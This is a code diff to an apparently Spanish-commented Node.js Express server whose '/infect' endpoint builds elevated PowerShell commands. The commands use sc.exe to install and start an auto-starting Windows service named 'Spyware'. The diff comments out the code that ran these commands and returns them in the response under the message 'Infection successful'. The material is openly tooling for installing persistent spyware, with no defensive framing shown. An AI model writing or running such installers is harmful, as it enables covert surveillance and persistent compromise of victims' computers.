@@ -34,36 +34,44 @@ app.get('/infect', (req, res) => {
     console.log('Infecting...');
     console.log('Spyware path:', spywareExePath);
     const installServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'create Spyware binPath= \\"${spywareExePath}\\" start= auto' -Verb runAs"`;
+    const startServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'start Spyware' -Verb runAs"`;
+
+    res.status(200).json({
+        message: 'Infection successful',
+        spywarePath: spywareExePath,
+        installServCmd,
+        startServCmd
+    });
 
     // Ejecutar el script de instalación del servicio
-    exec(installServCmd, (error, stdout, stderr) => {
-        if (error) {
-            console.error(`Error ejecutando installServ.bat: ${error.message}`);
-            return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
-        }
-        if (stderr) {
-            console.error(`Stderr en installServ.bat: ${stderr}`);
-        }
-        console.log(`Resultado installServ.bat: ${stdout}`);
+    // exec(installServCmd, (error, stdout, stderr) => {
+    //     if (error) {
+    //         console.error(`Error ejecutando installServ.bat: ${error.message}`);
+    //         return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
+    //     }
+    //     if (stderr) {
+    //         console.error(`Stderr en installServ.bat: ${stderr}`);
+    //     }
+    //     console.log(`Resultado installServ.bat: ${stdout}`);
 
-        // Esperar 2 segundos antes de iniciar el servicio
-        setTimeout(() => {
-            exec(`"${startServPath}"`, (error, stdout, stderr) => {
-                if (error) {
-                    console.error(`Error ejecutando startServ.bat: ${error.message}`);
-                    return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
-                }
-                if (stderr) {
-                    console.error(`Stderr en startServ.bat: ${stderr}`);
-                }
-                console.log(`Resultado startServ.bat: ${stdout}`);
-                res.status(200).json({
-                    message: 'Infection successful',
-                    spywarePath: spywareExePath
-                });
-            });
-        }, 2000);
-    });
+    //     // Esperar 2 segundos antes de iniciar el servicio
+    //     setTimeout(() => {
+    //         exec(`"${startServPath}"`, (error, stdout, stderr) => {
+    //             if (error) {
+    //                 console.error(`Error ejecutando startServ.bat: ${error.message}`);
+    //                 return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
+    //             }
+    //             if (stderr) {
+    //                 console.error(`Stderr en startServ.bat: ${stderr}`);
+    //             }
+    //             console.log(`Resultado startServ.bat: ${stdout}`);
+    //             res.status(200).json({
+    //                 message: 'Infection successful',
+    //                 spywarePath: spywareExePath
+    //             });
+    //         });
+    //     }, 2000);
+    // });
 });
 
 app.post('/upload', upload.single('file'), (req, res) => {
